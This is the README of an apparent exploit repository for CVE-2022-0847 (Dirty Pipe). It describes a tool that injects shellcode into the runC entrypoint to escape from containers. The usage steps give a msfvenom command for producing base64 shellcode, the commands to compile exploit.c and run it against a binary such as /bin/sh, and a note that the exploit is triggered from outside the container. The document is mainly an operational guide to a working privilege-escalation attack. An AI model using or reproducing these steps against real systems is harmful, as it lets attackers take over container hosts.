# CVE-2022-0847
A simple exploit that uses dirtypipe to inject shellcode into runC entrypoint to implement container escapes.

## Usage
Produce base64 encoded shellcode using msf:
```
$ msfvenom -p linux/x64/exec CMD="<command>" -f base64
```

Compile and run in the container, the **overwritten filename** is the bin that runC will execute in the container (such as /bin/sh):
```bash
$ gcc exploit.c -o exploit
$ ./exploit <overwritten filename> <base64 shellcode>
```

Trigger exploit and shellcode outside the container like CVE-2019-5736.

## References
+ [Breaking out of Docker via runC – Explaining CVE-2019-5736](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)
+ [Using the Dirty Pipe Vulnerability to Break Out from Containers](https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/)

